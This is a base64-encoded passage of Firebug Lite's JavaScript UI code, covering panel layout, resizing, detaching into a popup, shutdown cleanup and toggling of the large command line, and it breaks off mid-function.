CiAgICAgICAgDQogICAgICAgIEZpcmVidWcuY2hyb21lLmtleUlnbm9yZSA9IGZ1bmN0aW9uKGxpc3RlbmVyKQ0KICAgICAgICB7DQogICAgICAgICAgICByZW1vdmVFdmVudChGaXJlYnVnLmNocm9tZS5kb2N1bWVudCwgImtleWRvd24iLCBsaXN0ZW5lclswXSk7DQogICAgICAgIH07DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICAgICAgW2ZiUGFuZWwxLCAibW91c2Vkb3duIiwgb25QYW5lbE1vdXNlRG93bl0sDQogICAgICAgICAgICAgICAgW2ZiUGFuZWwyLCAibW91c2Vkb3duIiwgb25QYW5lbE1vdXNlRG93bl0NCiAgICAgICAgICAgICApOw0KLyoqLw0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICANCiAgICAgICAgDQogICAgICAgIC8vIG1lbnVzIGNhbiBiZSB1c2VkIHdpdGhvdXQgZG9tcGxhdGUNCiAgICAgICAgaWYgKEZCTC5kb21wbGF0ZSkNCiAgICAgICAgICAgIHRoaXMudGVzdE1lbnUoKTsNCiAgICAgICAgLyoqLw0KICAgICAgICANCiAgICAgICAgLy90ZXN0IFhIUg0KICAgICAgICAvKg0KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgIA0KICAgICAgICBGQkwuQWpheC5yZXF1ZXN0KHt1cmw6ICIuLi9jb250ZW50L2ZpcmVidWcvYm9vdC5qcyJ9KTsNCiAgICAgICAgRkJMLkFqYXgucmVxdWVzdCh7dXJsOiAiLi4vY29udGVudC9maXJlYnVnL2Jvb3QuanMuaW52YWxpZCJ9KTsNCiAgICAgICAgDQogICAgICAgIH0sMTAwMCk7DQogICAgICAgIC8qKi8NCiAgICB9LA0KICAgIA0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgDQogICAgICAgIGlmKEZpcmVidWcuSW5zcGVjdG9yKQ0KICAgICAgICAgICAgdGhpcy5pbnNwZWN0QnV0dG9uLnNodXRkb3duKCk7DQogICAgICAgIA0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICANCiAgICAgICAgLy8gcmVtb3ZlIGRpc2FibGVUZXh0U2VsZWN0aW9uIGV2ZW50IGhhbmRsZXJzDQogICAgICAgIHJlc3RvcmVUZXh0U2VsZWN0aW9uKCQoImZiVG9vbGJhciIpKTsNCiAgICAgICAgcmVzdG9yZVRleHRTZWxlY3Rpb24oJCgiZmJQYW5lbEJhckJveCIpKTsNCiAgICAgICAgcmVzdG9yZVRleHRTZWxlY3Rpb24oJCgiZmJQYW5lbEJhcjEiKSk7DQogICAgICAgIHJlc3RvcmVUZXh0U2VsZWN0aW9uKCQoImZiUGFuZWxCYXIyIikpOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gc2h1dGRvd24gaW5oZXJpdGVkIGNsYXNzZXMNCiAgICAgICAgQ29udHJvbGxlci5zaHV0ZG93bi5jYWxsKHRoaXMpOw0KICAgICAgICBQYW5lbEJhci5zaHV0ZG93bi5jYWxsKHRoaXMpOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gUmVtb3ZlIHRoZSBpbnRlcmZhY2UgZWxlbWVudHMgY2FjaGUgKHRoaXMgbXVzdCBoYXBwZW4gYWZ0ZXIgY2FsbGluZyANCiAgICAgICAgLy8gdGhlIHNodXRkb3duIG1ldGhvZCBvZiBhbGwgZGVwZW5kZW50IGNvbXBvbmVudHMgdG8gYXZvaWQgZXJyb3JzKQ0KDQogICAgICAgIGZiVG9wID0gbnVsbDsNCiAgICAgICAgZmJDb250ZW50ID0gbnVsbDsNCiAgICAgICAgZmJDb250ZW50U3R5bGUgPSBudWxsOw0KICAgICAgICBmYkJvdHRvbSA9IG51bGw7DQogICAgICAgIGZiQnRuSW5zcGVjdCA9IG51bGw7DQogICAgICAgIA0KICAgICAgICBmYlRvb2xiYXIgPSBudWxsOw0KDQogICAgICAgIGZiUGFuZWxCb3gxID0gbnVsbDsNCiAgICAgICAgZmJQYW5lbEJveDFTdHlsZSA9IG51bGw7DQogICAgICAgIGZiUGFuZWxCb3gyID0gbnVsbDsNCiAgICAgICAgZmJQYW5lbEJveDJTdHlsZSA9IG51bGw7DQogICAgICAgIGZiUGFuZWxCYXIyQm94ID0gbnVsbDsNCiAgICAgICAgZmJQYW5lbEJhcjJCb3hTdHlsZSA9IG51bGw7DQogIA0KICAgICAgICBmYkhTcGxpdHRlciA9IG51bGw7DQogICAgICAgIGZiVlNwbGl0dGVyID0gbnVsbDsNCiAgICAgICAgZmJWU3BsaXR0ZXJTdHlsZSA9IG51bGw7DQogIA0KICAgICAgICBmYlBhbmVsMSA9IG51bGw7DQogICAgICAgIGZiUGFuZWwxU3R5bGUgPSBudWxsOw0KICAgICAgICBmYlBhbmVsMiA9IG51bGw7DQogIA0KICAgICAgICBmYkNvbnNvbGUgPSBudWxsOw0KICAgICAgICBmYkNvbnNvbGVTdHlsZSA9IG51bGw7DQogICAgICAgIGZiSFRNTCA9IG51bGw7DQogIA0KICAgICAgICBmYkNvbW1hbmRMaW5lID0gbnVsbDsNCiAgICAgICAgZmJMYXJnZUNvbW1hbmRMaW5lID0gbnVsbDsNCiAgICAgICAgZmJMYXJnZUNvbW1hbmRCdXR0b25zID0gbnVsbDsNCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIC8vIHN0YXRpYyB2YWx1ZXMgY2FjaGUNCiAgICAgICAgDQogICAgICAgIHRvcEhlaWdodCA9IG51bGw7DQogICAgICAgIHRvcFBhcnRpYWxIZWlnaHQgPSBudWxsOw0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIHRvZ2dsZTogZnVuY3Rpb24oZm9yY2VPcGVuLCBwb3B1cCkNCiAgICB7DQogICAgICAgIGlmKHBvcHVwKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmRldGFjaCgpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKGlzT3BlcmEgJiYgRmlyZWJ1Zy5jaHJvbWUudHlwZSA9PSAicG9wdXAiICYmIEZpcmVidWcuY2hyb21lLm5vZGUuY2xvc2VkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBmcmFtZSA9IEZpcmVidWdDaHJvbWUuY2hyb21lTWFwLmZyYW1lOw0KICAgICAgICAgICAgICAgIGZyYW1lLnJlYXR0YWNoKCk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgRmlyZWJ1Z0Nocm9tZS5jaHJvbWVNYXAucG9wdXAgPSBudWxsOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZyYW1lLm9wZW4oKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBJZiB0aGUgY29udGV4dCBpcyBhIHBvcHVwLCBpZ25vcmVzIHRoZSB0b2dnbGUgcHJvY2Vzcw0KICAgICAgICAgICAgaWYgKEZpcmVidWcuY2hyb21lLnR5cGUgPT0gInBvcHVwIikgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgc2hvdWxkT3BlbiA9IGZvcmNlT3BlbiB8fCAhRmlyZWJ1Zy5jb250ZXh0LnBlcnNpc3RlZFN0YXRlLmlzT3BlbjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYoc2hvdWxkT3BlbikNCiAgICAgICAgICAgICAgIHRoaXMub3BlbigpOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgdGhpcy5jbG9zZSgpOw0KICAgICAgICB9ICAgICAgIA0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGRldGFjaDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYoIUZpcmVidWdDaHJvbWUuY2hyb21lTWFwLnBvcHVwKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmNsb3NlKCk7DQogICAgICAgICAgICBjcmVhdGVDaHJvbWVXaW5kb3coe3R5cGU6ICJwb3B1cCJ9KTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgcmVhdHRhY2g6IGZ1bmN0aW9uKG9sZENocm9tZSwgbmV3Q2hyb21lKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5icm93c2VyLndpbmRvdy5GaXJlYnVnID0gRmlyZWJ1ZzsNCiAgICAgICAgDQogICAgICAgIC8vIGNocm9tZSBzeW5jaHJvbml6YXRpb24NCiAgICAgICAgdmFyIG5ld1BhbmVsTWFwID0gbmV3Q2hyb21lLnBhbmVsTWFwOw0KICAgICAgICB2YXIgb2xkUGFuZWxNYXAgPSBvbGRDaHJvbWUucGFuZWxNYXA7DQogICAgICAgIA0KICAgICAgICB2YXIgcGFuZWw7DQogICAgICAgIGZvcih2YXIgbmFtZSBpbiBuZXdQYW5lbE1hcCkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gaW5uZXJIVE1MDQogICAgICAgICAgICBwYW5lbCA9IG5ld1BhbmVsTWFwW25hbWVdOyANCiAgICAgICAgICAgIGlmIChwYW5lbC5vcHRpb25zLmlubmVySFRNTFN5bmMpDQogICAgICAgICAgICAgICAgcGFuZWwucGFuZWxOb2RlLmlubmVySFRNTCA9IG9sZFBhbmVsTWFwW25hbWVdLnBhbmVsTm9kZS5pbm5lckhUTUw7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuY2hyb21lID0gbmV3Q2hyb21lOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gc3luYyBkZXRhY2ggcmVhdHRhY2ggYXR0YWNoDQogICAgICAgIC8vZGlzcGF0Y2goRmlyZWJ1Zy5jaHJvbWUucGFuZWxNYXAsICJkZXRhY2giLCBbb2xkQ2hyb21lLCBuZXdDaHJvbWVdKTsNCiAgICAgICAgDQogICAgICAgIGlmIChuZXdDaHJvbWUudHlwZSA9PSAicG9wdXAiKQ0KICAgICAgICB7DQogICAgICAgICAgICBuZXdDaHJvbWUuaW5pdGlhbGl6ZSgpOw0KICAgICAgICAgICAgLy9kaXNwYXRjaChGaXJlYnVnLm1vZHVsZXMsICJpbml0aWFsaXplIiwgW10pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gb25seSBuZWVkZWQgaW4gcGVyc2lzdGVudA0KICAgICAgICAgICAgLy8gc2hvdWxkIHVzZSBGaXJlYnVnQ2hyb21lLmNsb25lLCBidXQgcG9wdXAgRkJDaHJvbWUNCiAgICAgICAgICAgIC8vIGlzbid0IGFjZXNzaWJsZSANCiAgICAgICAgICAgIEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZFBhbmVsTmFtZSA9IG9sZENocm9tZS5zZWxlY3RlZFBhbmVsLm5hbWU7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGRpc3BhdGNoKG5ld1BhbmVsTWFwLCAicmVhdHRhY2giLCBbb2xkQ2hyb21lLCBuZXdDaHJvbWVdKTsNCiAgICB9LA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGRyYXc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHZhciBzaXplID0gdGhpcy5nZXRTaXplKCk7DQogICAgICAgIA0KICAgICAgICAvLyBIZWlnaHQgcmVsYXRlZCB2YWx1ZXMNCiAgICAgICAgdmFyIGNvbW1hbmRMaW5lSGVpZ2h0ID0gRmlyZWJ1Zy5jaHJvbWUuY29tbWFuZExpbmVWaXNpYmxlID8gZmJDb21tYW5kTGluZS5vZmZzZXRIZWlnaHQgOiAwLA0KICAgICAgICAgICAgDQogICAgICAgICAgICB5ID0gTWF0aC5tYXgoc2l6ZS5oZWlnaHQgLyogY2hyb21lIGhlaWdodCAqLywgdG9wSGVpZ2h0KSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaGVpZ2h0VmFsdWUgPSBNYXRoLm1heCh5IC0gdG9wSGVpZ2h0IC0gY29tbWFuZExpbmVIZWlnaHQgLyogZml4ZWQgaGVpZ2h0ICovLCAwKSwgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGhlaWdodCA9IGhlaWdodFZhbHVlICsgInB4IiwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gV2lkdGggcmVsYXRlZCB2YWx1ZXMNCiAgICAgICAgICAgIHNpZGVXaWR0aFZhbHVlID0gRmlyZWJ1Zy5jaHJvbWUuc2lkZVBhbmVsVmlzaWJsZSA/IEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zaWRlUGFuZWxXaWR0aCA6IDAsDQogICAgICAgICAgICANCiAgICAgICAgICAgIHdpZHRoID0gTWF0aC5tYXgoc2l6ZS53aWR0aCAvKiBjaHJvbWUgd2lkdGggKi8gLSBzaWRlV2lkdGhWYWx1ZSwgMCkgKyAicHgiOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gSGVpZ2h0IHJlbGF0ZWQgcmVuZGVyaW5nDQogICAgICAgIGZiUGFuZWxCb3gxU3R5bGUuaGVpZ2h0ID0gaGVpZ2h0Ow0KICAgICAgICBmYlBhbmVsMVN0eWxlLmhlaWdodCA9IGhlaWdodDsNCiAgICAgICAgDQogICAgICAgIGlmIChpc0lFIHx8IGlzT3BlcmEpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIEZpeCBJRSBhbmQgT3BlcmEgcHJvYmxlbXMgd2l0aCBhdXRvIHJlc2l6aW5nIHRoZSB2ZXJ0aWNhbGwgc3BsaXR0ZXINCiAgICAgICAgICAgIGZiVlNwbGl0dGVyU3R5bGUuaGVpZ2h0ID0gTWF0aC5tYXgoeSAtIHRvcFBhcnRpYWxIZWlnaHQgLSBjb21tYW5kTGluZUhlaWdodCwgMCkgKyAicHgiOw0KICAgICAgICB9DQogICAgICAgIC8veHh4cGVkcm8gRkYyIG9ubHk/DQogICAgICAgIC8qDQogICAgICAgIGVsc2UgaWYgKGlzRmlyZWZveCkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gRml4IEZpcmVmb3ggcHJvYmxlbSB3aXRoIHRhYmxlIHJvd3Mgd2l0aCAxMDAlIGhlaWdodCAoZml0IGhlaWdodCkNCiAgICAgICAgICAgIGZiQ29udGVudFN0eWxlLm1heEhlaWdodCA9IE1hdGgubWF4KHkgLSBmaXhlZEhlaWdodCwgMCkrICJweCI7DQogICAgICAgIH0vKiovDQogICAgICAgIA0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICAvLyBXaWR0aCByZWxhdGVkIHJlbmRlcmluZw0KICAgICAgICBmYlBhbmVsQm94MVN0eWxlLndpZHRoID0gd2lkdGg7DQogICAgICAgIGZiUGFuZWwxU3R5bGUud2lkdGggPSB3aWR0aDsNCiAgICAgICAgDQogICAgICAgIC8vIFNpZGVQYW5lbCByZW5kZXJpbmcNCiAgICAgICAgaWYgKEZpcmVidWcuY2hyb21lLnNpZGVQYW5lbFZpc2libGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIHNpZGVXaWR0aFZhbHVlID0gTWF0aC5tYXgoc2lkZVdpZHRoVmFsdWUgLSA2LCAwKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHNpZGVXaWR0aCA9IHNpZGVXaWR0aFZhbHVlICsgInB4IjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJQYW5lbEJveDJTdHlsZS53aWR0aCA9IHNpZGVXaWR0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJWU3BsaXR0ZXJTdHlsZS5yaWdodCA9IHNpZGVXaWR0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKEZpcmVidWcuY2hyb21lLmxhcmdlQ29tbWFuZExpbmVWaXNpYmxlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZSA9ICQoImZiTGFyZ2VDb21tYW5kTGluZSIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZS5zdHlsZS5oZWlnaHQgPSBoZWlnaHRWYWx1ZSAtIDQgKyAicHgiOw0KICAgICAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZS5zdHlsZS53aWR0aCA9IHNpZGVXaWR0aFZhbHVlIC0gMiArICJweCI7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZmJMYXJnZUNvbW1hbmRCdXR0b25zID0gJCgiZmJMYXJnZUNvbW1hbmRCdXR0b25zIik7DQogICAgICAgICAgICAgICAgZmJMYXJnZUNvbW1hbmRCdXR0b25zLnN0eWxlLndpZHRoID0gc2lkZVdpZHRoOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZiUGFuZWwyU3R5bGUuaGVpZ2h0ID0gaGVpZ2h0Ow0KICAgICAgICAgICAgICAgIGZiUGFuZWwyU3R5bGUud2lkdGggPSBzaWRlV2lkdGg7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZmJQYW5lbEJhcjJCb3hTdHlsZS53aWR0aCA9IHNpZGVXaWR0aDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGdldFNpemU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLnR5cGUgPT0gImRpdiIgPw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGhlaWdodDogdGhpcy5ub2RlLm9mZnNldEhlaWdodCwNCiAgICAgICAgICAgICAgICB3aWR0aDogdGhpcy5ub2RlLm9mZnNldFdpZHRoDQogICAgICAgICAgICB9DQogICAgICAgICAgICA6DQogICAgICAgICAgICB0aGlzLmdldFdpbmRvd1NpemUoKTsNCiAgICB9LA0KICAgIA0KICAgIHJlc2l6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHNlbGYgPSB0aGlzOw0KICAgICAgICANCiAgICAgICAgLy8gYXZvaWQgcGFydGlhbCByZXNpemUgd2hlbiBtYXhpbWl6aW5nIHdpbmRvdw0KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICBzZWxmLmRyYXcoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKG5vRml4ZWRQb3NpdGlvbiAmJiAoc2VsZi50eXBlID09ICJmcmFtZSIgfHwgc2VsZi50eXBlID09ICJkaXYiKSkNCiAgICAgICAgICAgICAgICBzZWxmLmZpeElFUG9zaXRpb24oKTsNCiAgICAgICAgfSwgMCk7DQogICAgfSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgbGF5b3V0OiBmdW5jdGlvbihwYW5lbCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DSFJPTUUpIEZCVHJhY2Uuc3lzb3V0KCJDaHJvbWUubGF5b3V0IiwgIiIpOw0KICAgICAgICANCiAgICAgICAgdmFyIG9wdGlvbnMgPSBwYW5lbC5vcHRpb25zOw0KICAgICAgICANCiAgICAgICAgY2hhbmdlQ29tbWFuZExpbmVWaXNpYmlsaXR5KG9wdGlvbnMuaGFzQ29tbWFuZExpbmUpOw0KICAgICAgICBjaGFuZ2VTaWRlUGFuZWxWaXNpYmlsaXR5KHBhbmVsLmhhc1NpZGVQYW5lbCk7DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmNocm9tZS5kcmF3KCk7DQogICAgfSwNCiAgICANCiAgICBzaG93TGFyZ2VDb21tYW5kTGluZTogZnVuY3Rpb24oaGlkZVRvZ2dsZUljb24pDQogICAgew0KICAgICAgICB2YXIgY2hyb21lID0gRmlyZWJ1Zy5jaHJvbWU7DQogICAgICAgIA0KICAgICAgICBpZiAoIWNocm9tZS5sYXJnZUNvbW1hbmRMaW5lVmlzaWJsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgY2hyb21lLmxhcmdlQ29tbWFuZExpbmVWaXNpYmxlID0gdHJ1ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGNocm9tZS5zZWxlY3RlZFBhbmVsLm9wdGlvbnMuaGFzQ29tbWFuZExpbmUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKEZpcmVidWcuQ29tbWFuZExpbmUpDQogICAgICAgICAgICAgICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuYmx1cigpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNoYW5nZUNvbW1hbmRMaW5lVmlzaWJpbGl0eShmYWxzZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNoYW5nZVNpZGVQYW5lbFZpc2liaWxpdHkodHJ1ZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kQnV0dG9ucy5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJQYW5lbDJTdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgZmJQYW5lbEJhcjJCb3hTdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjaHJvbWUuZHJhdygpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBmYkxhcmdlQ29tbWFuZExpbmUuZm9jdXMoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKEZpcmVidWcuQ29tbWFuZExpbmUpDQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5Db21tYW5kTGluZS5zZXRNdWx0aUxpbmUodHJ1ZSk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIGhpZGVMYXJnZUNvbW1hbmRMaW5lOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoRmlyZWJ1Zy5jaHJvbWUubGFyZ2VDb21tYW5kTGluZVZpc2libGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmxhcmdlQ29tbWFuZExpbmVWaXNpYmxlID0gZmFsc2U7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChGaXJlYnVnLkNvbW1hbmRMaW5lKQ0KICAgICAgICAgICAgICAgIEZpcmVidWcuQ29tbWFuZExpbmUuc2V0TXVsdGlMaW5lKGZhbHNlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJMYXJnZUNvbW1hbmRMaW5lLmJsdXIoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZmJQYW5lbDJTdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICAgICAgICAgIGZiUGFuZWxCYXIyQm94U3R5bGUuZGlzcGxheSA9ICJibG9jayI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgZmJMYXJnZUNvbW1hbmRCdXR0b25zLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7ICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGNoYW5nZVNpZGVQYW5lbFZpc2liaWxpdHkoZmFsc2UpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbC5vcHRpb25zLmhhc0NvbW1hbmRMaW5lKQ0KICAgICAgICAgICAgICAgIGNoYW5nZUNvbW1hbmRMaW5lVmlzaWJpbGl0eSh0cnVlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuZHJhdygpOw0KICAgICAgICAgICAgDQogICAgICAgIH0NCiAgICB9LCAgICANCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgZm9jdXNDb21tYW5kTGluZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHNlbGVjdGVkUGFuZWxOYW1lID0gdGhpcy5zZWxlY3RlZFBhbmVsLm5hbWUsIHBhbmVsVG9TZWxlY3Q7DQogICAgICAgIA0KICAgICAgICBpZiAoZm9jdXNDb21tYW5kTGluZVN0YXRlID09IDAgfHwgc2VsZWN0ZWRQYW5lbE5hbWUgIT0gIkNvbnNvbGU